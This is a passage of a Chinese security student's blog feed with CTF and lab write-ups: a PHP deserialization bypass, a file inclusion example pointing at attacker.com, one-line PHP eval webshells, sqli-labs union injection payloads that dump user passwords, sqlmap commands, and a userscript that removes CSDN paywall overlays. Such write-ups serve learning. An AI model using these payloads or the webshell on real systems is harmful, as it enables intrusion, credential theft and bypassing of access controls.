class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Letmeseesee</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>经过wp发现，在调用反序列化时，会自动执行_wakeip()导致passwd被sha1加密，并且不可逆，所以我们要考虑_wakeip()的让绕过</p><ul><li>知识点：php特性，当反序列化字符串中，表示对象属性个数的值大于真实属性个数时，会跳过__wakeup()函数的执行。</li></ul><pre><code class="php">$aa = new HaHaHa();$aa-&gt;admin = &quot;admin&quot;;$aa-&gt;passwd = &quot;wllm&quot;;$stus = serialize($aa);print_r($stus);</code></pre><p>O:6:”HaHaHa”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}<br>序列化之后我们可以改变参数数量,上传即可<br>O:6:”HaHaHa”:3:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>电子榨菜</title>
    <link href="/2024/10/26/%E7%94%B5%E5%AD%90%E6%A6%A8%E8%8F%9C/"/>
    <url>/2024/10/26/%E7%94%B5%E5%AD%90%E6%A6%A8%E8%8F%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="电子榨菜"><a href="#电子榨菜" class="headerlink" title="电子榨菜"></a>电子榨菜</h1><h2 id="2024-10-26-23-06-28"><a href="#2024-10-26-23-06-28" class="headerlink" title="2024-10-26 23:06:28"></a>2024-10-26 23:06:28</h2><p>写写干了什么，现在好想玩星际啊，不想写东西了，直接开完，这个geekcode还会接我话好玩的，星际推荐玩星际酒馆，不过在写这个东西的时候突然发现，一个功能，就是vscode的自动换行功能直接搜就行好用的，会根据现在的页面大小自动换行，星际战役好贵啊250，早十年玩就好了，还会送的，要不要写写明天干什么呢。，加个评论，看看这些好玩吧<br><img src="https://gitee.com/fogpost/photo/raw/master/202410262318542.png" srcset="/img/loading.gif" lazyload></p><h2 id="2024-10-29"><a href="#2024-10-29" class="headerlink" title="2024-10-29"></a>2024-10-29</h2><p>今天的网鼎杯也是坐上一次大牢了，八个小时满打满算直接看了5个小时的空挡，这个是安卓，也是坐上牢，我发现逆向领域简直就是一个乙游大世界，想要成熟稳重有我们的windows逆向，想要幽默风趣有我们的安卓逆向，想要老公姐有我们的硬件逆向，我们逆向领域真是吃得太好了，妈的刚刚发生了一件大事，狗吧微软把我的贴子吃掉了，php木马的篇帖子直接被删了没办法还原，看样子以后还是尽量用图片把，晚上陪337寝室出去嗨皮了一把，被ylq坑惨了，🐕吧带的什么破地方，吃不得，下次带我的好朋友hy去吃，明天开始看看逆向核心原理吧，沉淀得太少喽。<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292358898.jpg" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>电子榨菜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>snake</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>solidity</title>
    <link href="/2024/10/25/solidity/"/>
    <url>/2024/10/25/solidity/</url>
    
    <content type="html"><![CDATA[<h1 id="Solidity代码块"><a href="#Solidity代码块" class="headerlink" title="Solidity代码块"></a>Solidity代码块</h1><p>真不想写这个啊，没见过的代码，直接搜的到时候背就行</p><h2 id="完成加减运算"><a href="#完成加减运算" class="headerlink" title="完成加减运算"></a>完成加减运算</h2><p>int &#x2F; uint ：分别表示有符号和无符号的不同位数的整型变量。 支持关键字 uint8 到 uint256 （无符号，从 8 位到 256 位）以及 int8 到 int256，以 8 位为步长递增。 uint 和 int 分别是 uint256 和 int256 的别名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity &gt;=0.4.21 &lt;=0.8.0<br><br>contract MatchTest&#123;<br>    function add(uint i,uint j) pure public returns(uint)&#123;<br>        return i + j;<br>    &#125;<br>    function sub(uint i,uint j) pure public returns(uint)&#123;<br>        return i - j;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>你看连识别都用不了</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    <categories>
      
      <category>web3</category>
      
    </categories>
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csdnvip</title>
    <link href="/2024/10/25/csdnvip/"/>
    <url>/2024/10/25/csdnvip/</url>
    
    <content type="html"><![CDATA[<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>在最近的时候看csdn的垃圾文章老是弹出仅vip的情况，可喜可贺的是有大佬已经写了跳过脚本接下来我们将使用脚本来跳过这goshi的csdnvip检测</p><h1 id="脚本源码"><a href="#脚本源码" class="headerlink" title="脚本源码"></a>脚本源码</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// ==UserScript==</span><br><span class="hljs-comment">// @name         100%解锁CSDN文库vip文章阅读限制</span><br><span class="hljs-comment">// @namespace    http://tampermonkey.net/</span><br><span class="hljs-comment">// @version      2.2</span><br><span class="hljs-comment">// @description  CSDN文库阅读全文，去除VIP文章遮罩</span><br><span class="hljs-comment">// @author       Mrlimuyu</span><br><span class="hljs-comment">// @match        *://*.csdn.net/*</span><br><span class="hljs-comment">// @grant        none</span><br><span class="hljs-comment">// @license      yagiza</span><br><span class="hljs-comment">// @downloadURL https://update.greasyfork.org/scripts/495150/100%25%E8%A7%A3%E9%94%81CSDN%E6%96%87%E5%BA%93vip%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E9%99%90%E5%88%B6.user.js</span><br><span class="hljs-comment">// @updateURL https://update.greasyfork.org/scripts/495150/100%25%E8%A7%A3%E9%94%81CSDN%E6%96%87%E5%BA%93vip%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E9%99%90%E5%88%B6.meta.js</span><br><span class="hljs-comment">// ==/UserScript==</span><br><br>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-string">&#x27;use strict&#x27;</span>;<br><br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">adjustArticle</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>        <span class="hljs-comment">// 移除遮罩层和限制高度的内容</span><br>        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;.hide-article-box, .login-mark, .mask, .vip-caise&#x27;</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> el.<span class="hljs-title function_">remove</span>());<br><br>        <span class="hljs-comment">// 展开被限制高度的内容</span><br>        <span class="hljs-keyword">const</span> articleContainer = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.article_content&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (articleContainer) &#123;<br>            articleContainer.<span class="hljs-property">style</span>.<span class="hljs-property">maxHeight</span> = <span class="hljs-string">&#x27;none&#x27;</span>;<br>            articleContainer.<span class="hljs-property">style</span>.<span class="hljs-property">height</span> = <span class="hljs-string">&#x27;auto&#x27;</span>;<br>        &#125;<br>    &#125;;<br><br>    <span class="hljs-comment">// 启用复制功能</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">enableCopy</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>        <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">oncopy</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-variable language_">document</span>.<span class="hljs-property">oncopy</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;*&#x27;</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> &#123;<br>            el.<span class="hljs-property">style</span>.<span class="hljs-property">userSelect</span> = <span class="hljs-string">&#x27;auto&#x27;</span>;<br>            el.<span class="hljs-property">style</span>.<span class="hljs-property">webkitUserSelect</span> = <span class="hljs-string">&#x27;auto&#x27;</span>;<br>            el.<span class="hljs-property">style</span>.<span class="hljs-property">msUserSelect</span> = <span class="hljs-string">&#x27;auto&#x27;</span>;<br>            el.<span class="hljs-property">style</span>.<span class="hljs-property">mozUserSelect</span> = <span class="hljs-string">&#x27;auto&#x27;</span>;<br>        &#125;);<br>    &#125;;<br><br>    <span class="hljs-comment">// 使用MutationObserver来监视文档的变化</span><br>    <span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MutationObserver</span>(<span class="hljs-function">(<span class="hljs-params">mutations</span>) =&gt;</span> &#123;<br>        mutations.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">mutation</span>) =&gt;</span> &#123;<br>            <span class="hljs-keyword">if</span> (mutation.<span class="hljs-property">addedNodes</span>.<span class="hljs-property">length</span>) &#123;<br>                <span class="hljs-title function_">adjustArticle</span>();<br>                <span class="hljs-title function_">enableCopy</span>();<br>            &#125;<br>        &#125;);<br>    &#125;);<br><br>    observer.<span class="hljs-title function_">observe</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>, &#123;<br>        <span class="hljs-attr">childList</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">subtree</span>: <span class="hljs-literal">true</span><br>    &#125;);<br><br>    <span class="hljs-comment">// 页面加载时尝试执行一次</span><br>    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;load&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>        <span class="hljs-title function_">adjustArticle</span>();<br>        <span class="hljs-title function_">enableCopy</span>();<br>    &#125;);<br>&#125;)();<br></code></pre></td></tr></table></figure><h1 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h1><p>在我们成功加载脚本后，csdn的vip文章，仅限于可以查看部分原文的便可以查看剩余部分</p><h2 id="脚本前"><a href="#脚本前" class="headerlink" title="脚本前"></a>脚本前</h2><p><img src="https://gitee.com/fogpost/photo/raw/master/202410250839321.png" srcset="/img/loading.gif" lazyload></p><h2 id="脚本后"><a href="#脚本后" class="headerlink" title="脚本后"></a>脚本后</h2><p><img src="https://gitee.com/fogpost/photo/raw/master/202410250840351.png" srcset="/img/loading.gif" lazyload><br>但是果然垃圾csdn就没什么有用的部分，大部分都是小段垃圾</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>我想的是作为一个博客，应该就是在于能否传递有价值的信息和思想，而不是待着别人的文章就去抄然后发到网上，有些那种垃圾人就在自己的博客上写一些垃圾文章，然后发到csdn上，然后别人看到就点进去，浪费时间又看不到东西，写的时候要好好想想自己的这篇博客有什么效果，没效果的不如不写</p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTFweb2</title>
    <link href="/2024/10/19/NSSCTFweb2/"/>
    <url>/2024/10/19/NSSCTFweb2/</url>
    
    <content type="html"><![CDATA[<p>The future</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File contents: <span class="hljs-subst">$data</span>&quot;</span>;<br><span class="hljs-comment">//朴实无华，拿来就用    </span><br>File contents: <br></code></pre></td></tr></table></figure><p>一个简单的FIV文件包含漏洞<br>本地文件包含（LFI）<br>潜在的远程文件包含（RFI）漏洞<br>如果 PHP 配置中 allow_url_fopen 和 allow_url_include 设置为 On，攻击者甚至可以通过 file 参数引入远程文件，执行远程的恶意代码。假如配置不当，攻击者可以通过这样的 URL 进行远程文件包含：<br><a href="http://example.com/vulnerable.php?file=http://attacker.com/malicious_code.php">http://example.com/vulnerable.php?file=http://attacker.com/malicious_code.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sys|pas|read|file|ls|cat|tac| |head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>,<span class="hljs-variable">$code</span>))&#123;<br>     <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);  <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;./dududadadudu.png&quot; alt=&quot;Top Image&quot; style=&quot;display: block; margin: 0 auto; max-width: 20%; height: auto;&quot;&gt;&#x27;</span>; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;audio controls&gt;&#x27;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;source src=&quot;./dududadudada.mp3&quot; type=&quot;audio/mpeg&quot;&gt;&#x27;</span>;<br>         &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;./redhot.jpg&quot; alt=&quot;Top Image&quot; style=&quot;display: block; margin: 0 auto; max-width: 70%; height: auto;&quot;&gt;&#x27;</span>; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;这都不能bypass？不准你玩cod&quot;</span>); &#125;<br>    &#125;  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;喜欢用轮椅枪是吧，账号给你ban了！&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;./ban.png&quot; alt=&quot;Top Image&quot; style=&quot;display: block; margin: 0 auto; max-width: 70%; height: auto;&quot;&gt;&#x27;</span>; <br>&#125; <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>按钮事件</title>
    <link href="/2024/10/18/%E6%8C%89%E9%92%AE%E4%BA%8B%E4%BB%B6/"/>
    <url>/2024/10/18/%E6%8C%89%E9%92%AE%E4%BA%8B%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>在我们进行逆向时普遍会遇到出现弹窗，但是我们没有办法搜索到字符串完成定位点的问题，这个时候我们可以利用按钮时间来到达对应的输入断点<br><img src="https://gitee.com/fogpost/photo/raw/master/202410181444105.png" srcset="/img/loading.gif" lazyload><br>在我们这图中，在输入完数之后我们不点登录在od中查找二进制字符串，如下<br><img src="https://gitee.com/fogpost/photo/raw/master/202410181449498.png" srcset="/img/loading.gif" lazyload><br>之后我们会到达此处，此处的断点便是易语言的按钮事件断点<br><img src="https://gitee.com/fogpost/photo/raw/master/202410181450283.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hook</title>
    <link href="/2024/10/16/Hook/"/>
    <url>/2024/10/16/Hook/</url>
    
    <content type="html"><![CDATA[<h1 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Hook是一种技术，它允许一个程序监视和修改另一个程序的运行。Hook技术通常用于调试、修改程序行为、保护程序等目的。</p><p>在Windows操作系统中，Hook技术主要分为以下几种：键盘Hook、鼠标Hook、消息Hook、API Hook等。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>SetWindowsHookExA函数是Windows API中用于设置Hook的函数。它可以用于监视和修改其他程序的键盘、鼠标、消息等事件。</p><p>SetWindowsHookExA函数的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">HHOOK <span class="hljs-title function_">SetWindowsHookExA</span><span class="hljs-params">(</span><br><span class="hljs-params">  <span class="hljs-type">int</span>       idHook,</span><br><span class="hljs-params">  HOOKPROC  lpfn,</span><br><span class="hljs-params">  HINSTANCE hmod,</span><br><span class="hljs-params">  DWORD     dwThreadId</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><h3 id="键盘消息钩取练习"><a href="#键盘消息钩取练习" class="headerlink" title="键盘消息钩取练习"></a>键盘消息钩取练习</h3>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DLL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wuai第八课</title>
    <link href="/2024/10/15/wuai%E7%AC%AC%E5%85%AB%E8%AF%BE/"/>
    <url>/2024/10/15/wuai%E7%AC%AC%E5%85%AB%E8%AF%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="bss节区"><a href="#bss节区" class="headerlink" title=".bss节区"></a>.bss节区</h1><h2 id="bss节区简介"><a href="#bss节区简介" class="headerlink" title=".bss节区简介"></a>.bss节区简介</h2><p>bss节区是程序中未初始化的全局变量和静态变量所在的节区，它通常在程序开始执行前被初始化为0。bss节区的大小由程序中未初始化的全局变量和静态变量的数量和大小决定。</p><h2 id="bss节区的特点"><a href="#bss节区的特点" class="headerlink" title=".bss节区的特点"></a>.bss节区的特点</h2><p>可以用于反dump</p>]]></content>
    
    
    <categories>
      
      <category>课程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php一句话木马</title>
    <link href="/2024/10/09/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    <url>/2024/10/09/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<p>了解一下php的include函数顺便了解一句话木马的各种形式</p><h2 id="include函数"><a href="#include函数" class="headerlink" title="include函数"></a>include函数</h2><p>在php中，include函数用于引入一个文件，如果引入的文件不存在，则会抛出一个警告，但程序会继续执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;test.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果test.php不存在，则会抛出一个警告，但程序会继续执行，输出hello world。<br>我们也可以在文件中定义动态的文件名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$NSS</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NSS&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$NSS</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$NSS</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$NSS</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h2 id="木马举例"><a href="#木马举例" class="headerlink" title="木马举例"></a>木马举例</h2><blockquote><?php @eval($_POST['cmd']); ?><?php @eval($_POST[1]); ?><p>,简析一下这两马效果是一样的，但是数字与字符串的区别在于是否需要增加引号<br>一句话木马通常使用 POST 请求而不是 GET，因为 get传参有限制，在对某些waf进行垃圾数据填充时不方便，无法构造畸形的数据包</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli练习</title>
    <link href="/2024/10/06/sqli%E7%BB%83%E4%B9%A0/"/>
    <url>/2024/10/06/sqli%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="sqli开头简介"><a href="#sqli开头简介" class="headerlink" title="sqli开头简介"></a>sqli开头简介</h1><p>sql注入我们可以理解为，通过构造恶意的输入，从而让程序执行我们想要执行的代码。所以我们需要了解源代码中的sql注入是什么样的语句什么样的过滤，但是在黑盒中我们无法了解代码，这便需要我们去有足够的知识积累，所以我打算将这个靶场打完，我要做sql领域大神🥰！</p><h1 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h1><p>联合查询特点：<br>1、要求多条查询语句的查询列数是一致的！<br>2、要求多条查询语句的查询的每一列的类型和顺序最好一致<br>3、union关键字默认去重，如果使用union all 可以包含重复项  </p><p>version():查看数据库版本<br>database():查看使用的数据库<br>user():查看当前用户<br>limit:limit子句分批来获取所有数据<br>group_concat():一次性获取所有的数据库信息</p><p>information_schema.tables:包含了数据库里所有的表<br>table_name:表名<br>table_schema:数据库名<br>column_name:字段名</p><p>–dbs:是查看所有的数据库<br>–tables:是查看所有的表<br>–columns:是查看表中所有的字段名<br>–dump:是查询哪个表的数据</p><h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><ol><li>首先我们输入1，发现返回正常输入?id&#x3D;1’，返回错误，说明存在单引号注入<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060247359.png" srcset="/img/loading.gif" lazyload></li><li>输入?id&#x3D;1’ and ‘1’&#x3D;’1，页面回显正常<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060248949.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 1–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 2–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 3–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 4–+　　出现报错界面<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060250107.png" srcset="/img/loading.gif" lazyload><br>所以我们了解到了数据库表只有三列，确定了字段数</li><li>构造联合查询?id&#x3D;-1’ union select 1,2,3–+前面的id为-1，使前面的语句无效，用union查询是否有回显，发现2和3有回显<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060254643.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;-1’ union select 1,database(),version()–+发现回显了数据库名称和版本信息<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060256922.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+发现回显了数据库中的表名<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060259924.png" srcset="/img/loading.gif" lazyload></li><li>查询users的字段名?id&#x3D;-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;’users’–+<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060302469.png" srcset="/img/loading.gif" lazyload></li><li>查询users表中的内容-1’ union select 1,2,group_concat(0x5c,username,0x5c,password) from users –+ 0x5c是反斜杠的十六进制，用于连接这两个库的数据内容</li></ol><h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><ol><li>sqlmap -u <a href="http://sql/sqli-labs-master/Less-1/">http://sql/sqli-labs-master/Less-1/</a> –dbs 查看对应的库</li></ol><h1 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h1><h2 id="手工注入-1"><a href="#手工注入-1" class="headerlink" title="手工注入"></a>手工注入</h2><ol><li>输入?id&#x3D;1’，页面报错，说明存在单引号注入</li></ol>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql</title>
    <link href="/2024/10/01/sql/"/>
    <url>/2024/10/01/sql/</url>
    
    <content type="html"><![CDATA[<p>后面预计会把这些相同的文章全部集合起来，知识点主要都是做题得来得多做点题，省得什么都不会，难搞，也只有半年就要去考研了，唉ctfer起步太慢</p><h3 id="三个表"><a href="#三个表" class="headerlink" title="三个表"></a>三个表</h3><ul><li>information_schema.schemata: 该数据表存储了 mysql 数据库中的所有数据库的库名</li><li>information_schema.tables： 该数据表存储了 mysql 数据库中的所有数据表的表名</li><li>information_schema.columns: 该数据表存储了 mysql 数据库中的所有列的列名</li></ul><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>先讲讲什么加堆叠注入,堆叠注入就是一条sql语句后面加;，多条语句一起执行，比如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users;<span class="hljs-keyword">show</span> databases; <br></code></pre></td></tr></table></figure><p>就同时执行以上两条命令，所以我们可以增删改查，只要权限够<br>,其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 